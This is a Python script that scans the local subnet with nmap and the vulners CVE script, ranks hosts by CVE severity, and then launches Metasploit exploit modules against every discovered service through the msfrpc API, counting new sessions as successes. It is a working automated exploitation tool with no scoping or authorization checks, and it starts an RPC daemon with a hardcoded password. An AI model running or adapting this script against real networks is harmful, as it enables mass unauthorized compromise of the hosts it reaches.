import nmap
import socket
import struct
import os
import ipaddress
import re
import random, string
from datetime import datetime
import netifaces
import platform
import sys
import time
from pymetasploit3.msfrpc import *
import pandas as pd

startTime = datetime.now()

startDir = os.path.dirname(os.path.realpath(sys.argv[0]))

windows = 'window'
ourOS = platform.system()
if windows.lower() in ourOS.lower():
	slash = "\\"
	startDir = startDir.replace("\\\\", "\\")
	split = 3
else:
	slash = "/"
	split = 1
# Open file for writing our output and create if its not created already
f = open(startDir + slash + "overview.txt","a+")

# get host IP
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
try:
	# doesn't even have to be reachable
	s.connect(('10.255.255.255', 1))
	IP = s.getsockname()[0]
except:
	IP = '127.0.0.1'
finally:
	s.close()

# get OS platform for deciding code to run later if needed
operatingSystem = platform.system()
nm = nmap.PortScanner()

f.write('Begin Script @ {0} \n\n'.format(startTime))
f.write('------ Your Host ------\n')
f.write('Host IP: {0} \n'.format(IP))

# Cross Platform way to get the following info
for i in netifaces.interfaces():
   try:
      if netifaces.ifaddresses(i)[netifaces.AF_INET][0]['addr'].startswith("192") or netifaces.ifaddresses(i)[netifaces.AF_INET][0]['addr'].startswith("10") or netifaces.ifaddresses(i)[netifaces.AF_INET][0]['addr'].startswith("172"):
         f.write("Operating System: {0} \n".format(platform.system()))
         netmask = netifaces.ifaddresses(i)[netifaces.AF_INET][0]['netmask']
         f.write("Network Mask: {0} \n".format(netmask))
         f.write("Gateway IP: {0} \n".format(netifaces.gateways()['default'][netifaces.AF_INET][0]))
         break
      else:
         pass
   except:
	   pass

# Creates an ipaddress object that is used to hold all of the IPs on the subnet
subnet = ipaddress.ip_network(u'{0}/{1}'.format(IP, netmask),strict=False)

# Just a prompt for the output file
f.write('\nInitiating quick scan from host {0} to {1} \n'.format(subnet[0], subnet[-1]))


# NMAP subnet excluding our IP #
## make -Pn, -F, and speed (-T#) switch for during the run
nm.scan(hosts=str(subnet), arguments='-O -sV -T4 -Pn --script vulners --exclude ' + IP)

hostsCount = len(nm.all_hosts())
hostObjects = []
f.write("Count of alive hosts: {0}\n".format(hostsCount))
f2 = open("IPList.txt","a+")
f2.write('\n'.join(map(str,nm.all_hosts())))
f2.close()

f3 = open(startDir + slash + "serviceDetails.txt","a+")
f4 = open(startDir + slash + "cveDetails.txt","a+")

# '/' is not platform independant and neither is 'cd' #
def findModules(service, details, port, host):
    print("testing port:" + str(port))
    hostDir = 'cd ' + startDir[split:] + slash + host
    outFile = service + str(port) + '.csv'
    console.write('cd ' + slash)
    while console.read()['busy'] == "True":
        time.sleep(1)
    console.write(hostDir) # switch into host dir if not already
    while console.read()['busy'] == "True":
        time.sleep(1)
    search = 'search ' + service + ' -S ' + details + ' type:exploit && rank:excellent || rank:good -o ' + outFile
    try:
        console.write(search)
        while console.read()['busy'] == "True":
            time.sleep(1)
    except:
        print("error with search")
    return outFile



def exploitHost(host):
	hostSessions = len(client.sessions.list)
	countMSMod = 0
	exploitObjects = []
	try:
		os.system('cd ' + slash + ' && cd ' + startDir[split:] + ' && mkdir ' + host)
	except:
		pass
	for port in nm[host]['tcp'].keys():
		service = str(nm[host]['tcp'][port]['name'])
		details = str(nm[host]['tcp'][port]['product']) + " " + str(nm[host]['tcp'][port]['version'])
		exploitFile = findModules(service, details, port, host)
		filePath = host + slash + exploitFile
		try:
			df = pd.read_csv(filePath, skipinitialspace=True, usecols=['Name'])
			dfLen = len(df)
		except:
			dfLen = 0 # Metasploit returned "No results found"
		countMSMod = countMSMod + dfLen
		if dfLen > 0:
			for index, row in df.iterrows():
				exploitName = row['Name'][8:]
				print("Attempting module: " + exploitName)
				exploit2 = client.modules.use('exploit', exploitName)
				if len(exploit2.targetpayloads()[0]) >= 1:
					try: # set remote host
						exploit2['RHOSTS'] = host
					except:
						try:
							exploit2['RHOST'] = host
						except:
							pass
					try: # set port number
						exploit2['RPORT'] = port
					except:
						try:
							exploit2['RPORTS'] = port
						except:
							pass

					for item in exploit2.missing_required:
						print("Item not set: " + item + ". Exiting exploit " + exploitName)

					sessionsBefore = len(client.sessions.list)
					print("Sessions before: " + str(sessionsBefore))
					time.sleep(1)
					failed = True
					i = 0
					while failed is True and i <= len(exploit2.targetpayloads())-1:
						try:
							payload = exploit2.targetpayloads()[i]
							payloadObj = client.modules.use('payload', payload)
							print(exploit2.execute(payload=payloadObj))
							failed = False
						except:
							i += 1
					time.sleep(5)

					if len(client.sessions.list) > sessionsBefore:
						print("The exploit worked!")
						result = 'Success'
					else:
						print("The exploit failed")
						result = 'Fail'
					print("Sessions after: " + str(len(client.sessions.list)))

					hostExploits = {"IP":host, 'Service':service, 'Port':str(port), 'Exploit':exploitName, 'Payload':str(payload), 'Result':result}
					exploitObjects.append(hostExploits)
				else:
					print("No payload selected for: " + exploitName)
		else:
			pass # No modules found for this service / port
	for x in exploitObjects:
		print(x)
	hostSessions = len(client.sessions.list)-hostSessions
	return countMSMod, str(hostSessions)






for host in nm.all_hosts():
	cveCount = 0 # get len(tabs) / 3 for each port and add to cveCount
	topCVEscore = -1 # Highest CVE score for the system used to determine severity level
	severity = 'Inconclusive' # System vulnerability status based on highest CVE score between all services
	severityNum = 0 # map severity to a number 0-4 for ordering systems
	countCritical = 0 # total number of CVEs that fall in that severity level
	countHigh = 0 # total number of CVEs that fall in that severity level
	countMedium = 0 # total number of CVEs that fall in that severity level
	countLow = 0 # total number of CVEs that fall in that severity level
	countNone = 0 # total number of CVEs that fall in that severity level
	countNoCVEports = 0 # used to determine when to print "No CVEs for this host." (ie when no servies found or no CVEs found)

	try:
		OS = nm[host]['osmatch'][0]['name']
	except:
		 OS = 'No OS Found'
	f3.write("\nIP: {0}".format(host))
	f4.write("IP: {0}\n".format(host))
	try:
		f3.write("\nPort    Service                  Details")
		for port in nm[host]['tcp'].keys():
			serviceFull = str(port).ljust(8," ") + nm[host]['tcp'][port]['name'].ljust(25, " ") + nm[host]['tcp'][port]['product'] + " " + nm[host]['tcp'][port]['version']
			try:
				nm[host]['tcp'][port]['script']['vulners']
				f4.write("  Port: " + str(port))
			except:
				pass
			f3.write('\n\t' + serviceFull)
			try:
				tabs = []
				cveScoreList = []
				start = 1

				for m in re.finditer('\t', nm[host]['tcp'][port]['script']['vulners']):
					tabs.append(m.start())
				cveCount = cveCount + (len(tabs) / 3)
				currentCVEscore = float(nm[host]['tcp'][port]['script']['vulners'][tabs[1]+1:tabs[1]+2])
				if currentCVEscore > topCVEscore:
					topCVEscore = currentCVEscore
				while start <= len(tabs)-2:
					cveScoreList.append(float(nm[host]['tcp'][port]['script']['vulners'][tabs[start]+1:tabs[start+1]]))
					start += 3

				for score in cveScoreList:
					if currentCVEscore == 0:
						countNone += 1
					elif currentCVEscore >= 0.1 and currentCVEscore <=  3.9:
						countLow += 1
					elif currentCVEscore >= 4.0 and currentCVEscore <=  6.9:
						countMedium += 1
					elif currentCVEscore >= 7.0 and currentCVEscore <=  8.9:
						countHigh += 1
					elif currentCVEscore >= 9.0 and currentCVEscore <=  10:
						countCritical += 1

				### Use this if you want to print CVE details for each service ###
				try:
					f4.write('        ' + nm[host]['tcp'][port]['script']['vulners'] + '\n\n')
				except:
					pass
			except:
				countNoCVEports += 1
				if countNoCVEports == len(nm[host]['tcp'].keys()):
					f4.write("  No CVEs for this host.\n\n")
				else:
					pass
	except:
		f3.write("\n\tNo Services for this host.\n")
		f4.write("No CVEs for this host.\n")

	if topCVEscore == -1:
		severity = 'Inconclusive'
		severityNum = -1
	elif topCVEscore == 0:
		severity = 'None'
		severityNum = 0
	elif topCVEscore >= 0.1 and topCVEscore <=  3.9:
		severity = 'Low'
		severityNum = 1
	elif topCVEscore >= 4.0 and topCVEscore <=  6.9:
		severity = 'Medium'
		severityNum = 2
	elif topCVEscore >= 7.0 and topCVEscore <=  8.9:
		severity = 'High'
		severityNum = 3
	elif topCVEscore >= 9.0 and topCVEscore <=  10:
		severity = 'Critical'
		severityNum = 4

	thisHost = {"IP":host, "Severity":severity, "SeverityNum":severityNum, "Criticals":countCritical, "Highs":countHigh, "Mediums":countMedium, "Lows":countLow, "Nones":countNone, "CVECount":cveCount, "OS":OS}
	hostObjects.append(thisHost)
f3.close()

hostObjects.sort(key = lambda l: (l["SeverityNum"], l["Criticals"], l["Highs"], l["Mediums"], l["Lows"], l["Nones"]), reverse = True)
printed4 = False
printed3 = False
printed2 = False
printed1 = False
printed0 = False
printedNeg = False


# start msf remote api
os.system("msfrpcd -P testpw -S")
time.sleep(5) # pause for the service to fully start
client = MsfRpcClient('testpw', port=55553, ssl=False) # make connection

cid = client.consoles.console().cid # create console and get Id
console = client.consoles.console(cid)



for sys in hostObjects:
	msTested, msSessions = exploitHost(sys["IP"])
	if sys["SeverityNum"] == 4:
		if printed4 == False:
			printed4 = True
			f.write("\n--- Vulnerability Level: Critical ---\n")
			f.write("\tIP: {0} - {9}\n\t\tSeverity: {1} ({2})\n\t\tCritical CVEs: {3}\n\t\tHigh CVEs: {4}\n\t\tMedium CVEs: {5}\n\t\tLow CVEs: {6}\n\t\tNone CVEs: {7}\n\t\tTotal CVEs: {8}\n\t\tMetasploit Modules Tested: {10}\n\t\tSuccessful Modules: {11}\n".format(sys["IP"],sys["Severity"],sys["SeverityNum"],sys["Criticals"],sys["Highs"],sys["Mediums"],sys["Lows"],sys["Nones"],sys["CVECount"], sys["OS"], msTested, msSessions))
		else:
			f.write("\tIP: {0} - {9}\n\t\tSeverity: {1} ({2})\n\t\tCritical CVEs: {3}\n\t\tHigh CVEs: {4}\n\t\tMedium CVEs: {5}\n\t\tLow CVEs: {6}\n\t\tNone CVEs: {7}\n\t\tTotal CVEs: {8}\n\t\tMetasploit Modules Tested: {10}\n\t\tSuccessful Modules: {11}\n".format(sys["IP"],sys["Severity"],sys["SeverityNum"],sys["Criticals"],sys["Highs"],sys["Mediums"],sys["Lows"],sys["Nones"],sys["CVECount"], sys["OS"], msTested, msSessions))
	elif sys["SeverityNum"] == 3:
		if printed3 == False:
			printed3 = True
			f.write("\n--- Vulnerability Level: High ---\n")
			f.write("\tIP: {0} - {9}\n\t\tSeverity: {1} ({2})\n\t\tCritical CVEs: {3}\n\t\tHigh CVEs: {4}\n\t\tMedium CVEs: {5}\n\t\tLow CVEs: {6}\n\t\tNone CVEs: {7}\n\t\tTotal CVEs: {8}\n\t\tMetasploit Modules Tested: {10}\n\t\tSuccessful Modules: {11}\n".format(sys["IP"],sys["Severity"],sys["SeverityNum"],sys["Criticals"],sys["Highs"],sys["Mediums"],sys["Lows"],sys["Nones"],sys["CVECount"], sys["OS"], msTested, msSessions))
		else:
			f.write("\tIP: {0} - {9}\n\t\tSeverity: {1} ({2})\n\t\tCritical CVEs: {3}\n\t\tHigh CVEs: {4}\n\t\tMedium CVEs: {5}\n\t\tLow CVEs: {6}\n\t\tNone CVEs: {7}\n\t\tTotal CVEs: {8}\n\t\tMetasploit Modules Tested: {10}\n\t\tSuccessful Modules: {11}\n".format(sys["IP"],sys["Severity"],sys["SeverityNum"],sys["Criticals"],sys["Highs"],sys["Mediums"],sys["Lows"],sys["Nones"],sys["CVECount"], sys["OS"], msTested, msSessions))
	elif sys["SeverityNum"] == 2:
		if printed2 == False:
			printed2 = True
			f.write("\n--- Vulnerability Level: Medium ---\n")
			f.write("\tIP: {0} - {9}\n\t\tSeverity: {1} ({2})\n\t\tCritical CVEs: {3}\n\t\tHigh CVEs: {4}\n\t\tMedium CVEs: {5}\n\t\tLow CVEs: {6}\n\t\tNone CVEs: {7}\n\t\tTotal CVEs: {8}\n\t\tMetasploit Modules Tested: {10}\n\t\tSuccessful Modules: {11}\n".format(sys["IP"],sys["Severity"],sys["SeverityNum"],sys["Criticals"],sys["Highs"],sys["Mediums"],sys["Lows"],sys["Nones"],sys["CVECount"], sys["OS"], msTested, msSessions))
		else:
			f.write("\tIP: {0} - {9}\n\t\tSeverity: {1} ({2})\n\t\tCritical CVEs: {3}\n\t\tHigh CVEs: {4}\n\t\tMedium CVEs: {5}\n\t\tLow CVEs: {6}\n\t\tNone CVEs: {7}\n\t\tTotal CVEs: {8}\n\t\tMetasploit Modules Tested: {10}\n\t\tSuccessful Modules: {11}\n".format(sys["IP"],sys["Severity"],sys["SeverityNum"],sys["Criticals"],sys["Highs"],sys["Mediums"],sys["Lows"],sys["Nones"],sys["CVECount"], sys["OS"], msTested, msSessions))
	elif sys["SeverityNum"] == 1:
		if printed1 == False:
			printed1 = True
			f.write("\n--- Vulnerability Level: Low ---\n")
			f.write("\tIP: {0} - {9}\n\t\tSeverity: {1} ({2})\n\t\tCritical CVEs: {3}\n\t\tHigh CVEs: {4}\n\t\tMedium CVEs: {5}\n\t\tLow CVEs: {6}\n\t\tNone CVEs: {7}\n\t\tTotal CVEs: {8}\n\t\tMetasploit Modules Tested: {10}\n\t\tSuccessful Modules: {11}\n".format(sys["IP"],sys["Severity"],sys["SeverityNum"],sys["Criticals"],sys["Highs"],sys["Mediums"],sys["Lows"],sys["Nones"],sys["CVECount"], sys["OS"], msTested, msSessions))
		else:
			f.write("\tIP: {0} - {9}\n\t\tSeverity: {1} ({2})\n\t\tCritical CVEs: {3}\n\t\tHigh CVEs: {4}\n\t\tMedium CVEs: {5}\n\t\tLow CVEs: {6}\n\t\tNone CVEs: {7}\n\t\tTotal CVEs: {8}\n\t\tMetasploit Modules Tested: {10}\n\t\tSuccessful Modules: {11}\n".format(sys["IP"],sys["Severity"],sys["SeverityNum"],sys["Criticals"],sys["Highs"],sys["Mediums"],sys["Lows"],sys["Nones"],sys["CVECount"], sys["OS"], msTested, msSessions))
	elif sys["SeverityNum"] == 0:
		if printed0 == False:
			printed0 = True
			f.write("\n--- Vulnerability Level: None ---\n")
			f.write("\tIP: {0} - {9}\n\t\tSeverity: {1} ({2})\n\t\tCritical CVEs: {3}\n\t\tHigh CVEs: {4}\n\t\tMedium CVEs: {5}\n\t\tLow CVEs: {6}\n\t\tNone CVEs: {7}\n\t\tTotal CVEs: {8}\n\t\tMetasploit Modules Tested: {10}\n\t\tSuccessful Modules: {11}\n".format(sys["IP"],sys["Severity"],sys["SeverityNum"],sys["Criticals"],sys["Highs"],sys["Mediums"],sys["Lows"],sys["Nones"],sys["CVECount"], sys["OS"], msTested, msSessions))
		else:
			f.write("\tIP: {0} - {9}\n\t\tSeverity: {1} ({2})\n\t\tCritical CVEs: {3}\n\t\tHigh CVEs: {4}\n\t\tMedium CVEs: {5}\n\t\tLow CVEs: {6}\n\t\tNone CVEs: {7}\n\t\tTotal CVEs: {8}\n\t\tMetasploit Modules Tested: {10}\n\t\tSuccessful Modules: {11}\n".format(sys["IP"],sys["Severity"],sys["SeverityNum"],sys["Criticals"],sys["Highs"],sys["Mediums"],sys["Lows"],sys["Nones"],sys["CVECount"], sys["OS"], msTested, msSessions))
	elif sys["SeverityNum"] == -1:
		if printedNeg  == False:
			printedNeg = True
			f.write("\n--- Vulnerability Level: Inconclusive ---\n")
			f.write("\tIP: {0} - {9}\n\t\tSeverity: {1} ({2})\n\t\tCritical CVEs: {3}\n\t\tHigh CVEs: {4}\n\t\tMedium CVEs: {5}\n\t\tLow CVEs: {6}\n\t\tNone CVEs: {7}\n\t\tTotal CVEs: {8}\n\t\tMetasploit Modules Tested: {10}\n\t\tSuccessful Modules: {11}\n".format(sys["IP"],sys["Severity"],sys["SeverityNum"],sys["Criticals"],sys["Highs"],sys["Mediums"],sys["Lows"],sys["Nones"],sys["CVECount"], sys["OS"], msTested, msSessions))
		else:
			f.write("\tIP: {0} - {9}\n\t\tSeverity: {1} ({2})\n\t\tCritical CVEs: {3}\n\t\tHigh CVEs: {4}\n\t\tMedium CVEs: {5}\n\t\tLow CVEs: {6}\n\t\tNone CVEs: {7}\n\t\tTotal CVEs: {8}\n\t\tMetasploit Modules Tested: {10}\n\t\tSuccessful Modules: {11}\n".format(sys["IP"],sys["Severity"],sys["SeverityNum"],sys["Criticals"],sys["Highs"],sys["Mediums"],sys["Lows"],sys["Nones"],sys["CVECount"], sys["OS"], msTested, msSessions))


endTime = datetime.now()
runtime = endTime-startTime
os.system("killall ruby")
f.write('\n\n End Script @ {0}    ---   Total Runtime: {1}'.format(endTime, runtime))
f.close()
